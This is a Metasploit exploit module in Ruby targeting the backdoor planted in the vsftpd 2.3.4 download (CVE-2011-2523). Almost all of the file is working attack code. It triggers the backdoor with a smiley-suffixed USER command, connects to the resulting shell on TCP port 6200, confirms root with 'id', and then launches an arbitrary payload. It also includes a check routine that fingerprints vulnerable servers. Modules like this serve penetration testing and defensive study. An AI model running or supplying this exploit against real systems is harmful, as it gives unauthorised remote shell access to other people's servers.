##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'VSFTPD v2.3.4 Backdoor Command Execution',
        'Description' => %q{
          This module exploits a malicious backdoor that was added to the	VSFTPD download
          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
          June 30th 2011 and July 1st 2011 according to the most recent information
          available. This backdoor was removed on July 3rd 2011.
        },
        'Author' => [ 'hdm', 'MC' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2011-2523' ],
          [ 'OSVDB', '73573'],
          [ 'URL', 'http://pastebin.com/AetT9sS5'],
          [ 'URL', 'http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html' ],
        ],
        'Privileged' => true,
        'Platform' => [ 'unix' ],
        'Arch' => ARCH_CMD,
        'Payload' => {
          'Space' => 2000,
          'BadChars' => '',
          'DisableNops' => true,
          'Compat' =>
                        {
                          'PayloadType' => 'cmd_interact',
                          'ConnectionType' => 'find'
                        }
        },
        'Targets' => [
          [ 'Automatic', {} ],
        ],
        'DisclosureDate' => '2011-07-03',
        'DefaultTarget' => 0,
        'Notes' => {
          'Reliability' => UNKNOWN_RELIABILITY,
          'Stability' => UNKNOWN_STABILITY,
          'SideEffects' => UNKNOWN_SIDE_EFFECTS
        }
      )
    )

    register_options([ Opt::RPORT(21) ])
  end

  def check
    # Check for backdoor first, else exploit will fail
    vprint_status("Checking if backdoor has already been triggered (else exploit will fail)")
    nsock = self.connect(false, { 'RPORT' => 6200 }) rescue nil
    if nsock
      print_error("The port used by the backdoor bind listener is already open/in-use (6200/TCP)")
      return Exploit::CheckCode::Unknown
    end

    vprint_status("Connecting to FTP service")
    connect

    vprint_status("Checking FTP banner")
    banner = sock.get_once(-1, 30).to_s

    if banner.downcase.include?("vsftpd 2.3.4")
      print_status("FTP banner hints its vulnerable: #{banner.strip}")
    else
      vprint_status("FTP banner: #{banner.strip}")
    end

    ftp_user = rand_text_alphanumeric(rand(6) + 1)
    vprint_status("Trying to log into FTP (User: #{ftp_user})")
    sock.put("USER #{ftp_user}\r\n")
    resp = sock.get_once(-1, 30).to_s
    if resp =~ /^530 /
      print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
      return Exploit::CheckCode::Safe
    end

    if resp !~ /^331 /
      print_error("This server did not respond as expected: #{resp.strip}")
      return Exploit::CheckCode::Unknown
    end

    return Exploit::CheckCode::Appears if banner.downcase.include?("vsftpd 2.3.4") and resp =~ /^331 /
    return Exploit::CheckCode::Unknown
  end

  def exploit
    framework.sessions.each do |sid, sess|
      next unless sess.via_exploit
      if sess.via_exploit == fullname
        vprint_error("Session #{sid} is already connected to the backdoor")
      end
    end

    nsock = self.connect(false, { 'RPORT' => 6200 }) rescue nil
    if nsock
      print_warning("The port used by the backdoor bind listener is already open. Trying...")
      begin
        handle_backdoor(nsock)
      rescue
        vprint_error("Someone has beat us to it, the backdoor is already in-use!")
        raise Msf::Exploit::Failed, "Backdoor already in-use"
      end
    end

    # Connect to the FTP service port first
    connect

    banner = sock.get_once(-1, 30).to_s
    print_status("Banner: #{banner.strip}")

    sock.put("USER #{rand_text_alphanumeric(rand(6) + 1)}:)\r\n")
    resp = sock.get_once(-1, 30).to_s
    print_status("USER: #{resp.strip}")

    if resp =~ /^530 /
      print_error("This server is configured for anonymous only and the backdoor code cannot be reached")
      disconnect
      return
    end

    if resp !~ /^331 /
      print_error("This server did not respond as expected: #{resp.strip}")
      disconnect
      return
    end

    sock.put("PASS #{rand_text_alphanumeric(rand(6) + 1)}\r\n")

    # Do not bother reading the response from password, just try the backdoor
    nsock = self.connect(false, { 'RPORT' => 6200 }) rescue nil
    if nsock
      print_good("Backdoor service has been spawned, handling...")
      handle_backdoor(nsock)
      return
    end

    disconnect
  end

  def handle_backdoor(s)
    s.put("id\n")

    r = s.get_once(-1, 5).to_s
    if r !~ /uid=/
      print_error("The service on port 6200 does not appear to be a shell")
      disconnect(s)
      raise Msf::Exploit::Failed, 'Could not connect to backdoor'
    end

    print_good("UID: #{r.strip}")

    s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
    handler(s)
  end
end
